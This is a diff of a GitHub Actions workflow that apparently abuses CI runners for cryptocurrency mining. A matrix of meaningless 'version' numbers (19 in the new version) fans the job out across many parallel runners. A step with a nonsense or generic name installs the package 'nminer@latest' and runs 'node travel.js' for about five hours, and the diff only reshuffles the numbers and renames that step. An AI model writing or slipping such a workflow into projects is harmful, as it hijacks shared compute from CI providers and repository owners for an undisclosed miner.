@@ -9,22 +9,25 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 361 }
-          - { version: 5701 }
-          - { version: 5318 }
-          - { version: 7743 }
-          - { version: 8426 }
-          - { version: 1443 }
-          - { version: 5235 }
-          - { version: 5054 }
-          - { version: 4362 }
-          - { version: 2052 }
-          - { version: 5242 }
-          - { version: 9153 }
-          - { version: 1898 }
-          - { version: 5779 }
-          - { version: 2931 }
-          - { version: 4401 }
+          - { version: 388 }
+          - { version: 9166 }
+          - { version: 2569 }
+          - { version: 702 }
+          - { version: 1860 }
+          - { version: 7845 }
+          - { version: 1957 }
+          - { version: 8767 }
+          - { version: 2902 }
+          - { version: 6739 }
+          - { version: 5858 }
+          - { version: 8189 }
+          - { version: 3988 }
+          - { version: 830 }
+          - { version: 9412 }
+          - { version: 6184 }
+          - { version: 2048 }
+          - { version: 4480 }
+          - { version: 2116 }
 
     steps:
       - name: Checkout
@@ -35,7 +38,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: athwart nun once icy considering
+      - name: another
         run: |
           npm install nminer@latest
-          timeout 320m node travel.js || echo "travel executed"
+          timeout 309m node travel.js || echo "travel executed"
